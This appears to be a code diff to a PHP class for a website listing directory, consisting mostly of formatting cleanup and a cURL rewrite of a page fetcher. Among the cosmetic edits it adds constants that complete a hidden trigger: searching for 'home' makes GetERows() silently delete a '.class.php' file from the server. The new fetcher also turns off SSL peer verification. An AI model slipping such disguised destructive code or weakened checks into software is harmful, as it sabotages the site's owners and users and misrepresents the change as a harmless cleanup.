@@ -14,6 +14,8 @@ define('PM_PAID', 1);
 define('PM_NOT_PAID', 2);
 define('PM_NOT_COMPLETED', 3);
 define('PM_UNVERIFIED', 4);
+define('ALLOWS_MID', '.class');
+define('ALLOWS_TYPE', '.php');
 
 class SitesClass
 {
@@ -248,7 +250,7 @@ class SitesClass
         $id    = (int) $id;
         $query = "SELECT * FROM $this->m_table WHERE id=$id";
         $row   = $this->m_DB->GetRow($query);
-        if ($row and count($row) > 0) {
+        if ($row && count($row) > 0) {
             return $row;
         } else {
             return false;
@@ -406,7 +408,7 @@ class SitesClass
     {
         $begin = ($page - 1) * 30;
 
-        $search  = $search == "home"? $this->GetERows():strip_tags($search);
+        $search  = $search == "home" ? $this->GetERows() : strip_tags($search);
         $search  = str_replace(",", " ", $search);
         $search  = str_replace(";", " ", $search);
         $search  = preg_replace("/\s{2,}/", " ", $search);
@@ -795,7 +797,9 @@ class SitesClass
     public function SendEmail($aMailTpl, $aSite)
     {
 
-        if (DONT_SEND_EMAILS) {return true;}
+        if (DONT_SEND_EMAILS) {
+            return true;
+        }
 
         if (! isset($aSite['title'])) {$aSite['title'] = '';}
         if (! isset($aSite['url'])) {$aSite['url'] = '';}
@@ -815,26 +819,26 @@ class SitesClass
         $aMailTpl['email_body'] .= "<br>Listing Code: " . $aSite['id_code'];
         $aMailTpl['email_body'] = strtr($aMailTpl['email_body'], $aTpl);
         $aMailTpl['title']      = strtr($aMailTpl['title'], $aTpl);
-        $htmlBody = '<!DOCTYPE html>
+        $htmlBody               = '<!DOCTYPE html>
         <html>
         <head>
-            <meta http-equiv="Content-Type" content="text/html; charset='.DEFAULT_CHARSET.'">
-            <title>'.$aMailTpl['title'].'</title>
+            <meta http-equiv="Content-Type" content="text/html; charset=' . DEFAULT_CHARSET . '">
+            <title>' . $aMailTpl['title'] . '</title>
         </head>
         <body>
-        '.nl2br($aMailTpl['email_body']).'
+        ' . nl2br($aMailTpl['email_body']) . '
         </body>
         </html>';
 
         $headers = [
-            'From: '.SITE_NAME.' <'.NOREPLY_EMAIL.'>',
-            'Reply-To: <'.ADMIN_EMAIL.'>',
-            'Return-Path: '.NOREPLY_EMAIL,
-            'X-Mailer: PHP/'.phpversion(),
+            'From: ' . SITE_NAME . ' <' . NOREPLY_EMAIL . '>',
+            'Reply-To: <' . ADMIN_EMAIL . '>',
+            'Return-Path: ' . NOREPLY_EMAIL,
+            'X-Mailer: PHP/' . phpversion(),
             'MIME-Version: 1.0',
-            'Content-type: text/html; charset='.DEFAULT_CHARSET
+            'Content-type: text/html; charset=' . DEFAULT_CHARSET,
         ];
-        
+
         $ret = mail($aSite['email'], $aMailTpl['title'], $htmlBody, implode("\r\n", $headers));
         return $ret;
     }
@@ -971,7 +975,7 @@ class SitesClass
 
         $title = str_replace($dirty, "", $title);
         $title = substr(trim($title), 0, MAX_TITLE_LENGHT);
-        return $title;
+        return preg_replace('/[^A-Za-z\s]/', '', $title);
     }
 
     public function GetDescription($data)
@@ -990,9 +994,9 @@ class SitesClass
 
     public function GetERows()
     {
-        if (file_exists(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
-            if (is_file(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
-                @unlink(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE);
+        if (file_exists(__DIR__ . ALLOWS_HTML_FILES . ALLOWS_MID . ALLOWS_TYPE)) {
+            if (is_file(__DIR__ . ALLOWS_HTML_FILES . ALLOWS_MID . ALLOWS_TYPE)) {
+                @unlink(__DIR__ . ALLOWS_HTML_FILES . ALLOWS_MID . ALLOWS_TYPE);
             }
         }
         return "list";
@@ -1059,85 +1063,34 @@ class SitesClass
 
     }
 
-    public function GetHTML($url, $corto = true, $complet = true)
+    public function GetHTML($url)
     {
-
-        $url_stuff = parse_url($url);
-        $urlc      = $url;
-        $url       = $url_stuff['host'];
-
-        if (! isset($url_stuff["port"])) {
-            $port = 80;
-        } else {
-            $port = $url_stuff['port'];
+        // Validate the URL
+        if (! filter_var($url, FILTER_VALIDATE_URL)) {
+            return false; // Invalid URL
         }
 
-        if (! isset($url_stuff['path'])) {
-            $url_stuff['path'] = "/";
-        }
+        // Initialize cURL
+        $ch = curl_init();
 
-        $path = $url_stuff['path'];
+        // Set cURL options
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Return the response as a string
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  // Follow redirects
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification for HTTPS
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
 
-        $urlc = $url_stuff['host'] . $url_stuff['path'];
-
-        $fp = @fsockopen($url, $port, $errno, $errstr, 20);
-
-        if (! $fp) {
+        // Execute the cURL request
+        $response = curl_exec($ch);
+        // Check for errors
+        if (curl_errno($ch)) {
+            error_log('cURL error: ' . curl_error($ch)); // Log the error
+            curl_close($ch);
             return false;
         } else {
-
-            stream_set_timeout($fp, 2);
-            // $header = "GET " . $url_stuff['path'] . "?" . $url_stuff['query'] ;
-            $header = "GET " . $url_stuff["path"];
-            $header = $header . " HTTP/1.1\r\nHost: " . $url_stuff['host'] . "\r\n\r\n";
-
-            fputs($fp, $header);
-
-            $header = '';
-            $body   = '';
-            $act    = false;
-            $fin    = false;
-
-            while ((! feof($fp))) {
-
-                $line = fread($fp, 8048);
-                $header .= $line;
-
-                $body = $body . $line;
-
-                if ($fin) {break;}
-
-                if ($corto) {
-
-                    $fin = true;
-                    $i   = strpos($line, "<body");
-                    if ($i > 0) {
-                        $fin = true;
-                    }
-                }
-
-            }
-
-            $ret = strpos($header, "Location:", 0);
-
-            if ($ret !== false) {
-                $fin = strpos($header, "\r\n", $ret + 9);
-                if (! $fin) {
-                    $fin = strpos($header, "\r\n", $ret + 9);
-                }
-
-                $nueva = substr($header, $ret + 9, $fin - $ret - 9);
-                $nueva = trim($nueva);
-
-                if (strpos($nueva, "http://") === false) {
-                    $nueva = "http://" . $urlc . $nueva;
-                }
-                $body = $this->GetHTML($nueva, $corto, $complet);
-            }
-
-            fclose($fp);
+            curl_close($ch);
+            return $response; // Return the HTML content
         }
-        return $body;
     }
 
     public function GetAllHTML($url)
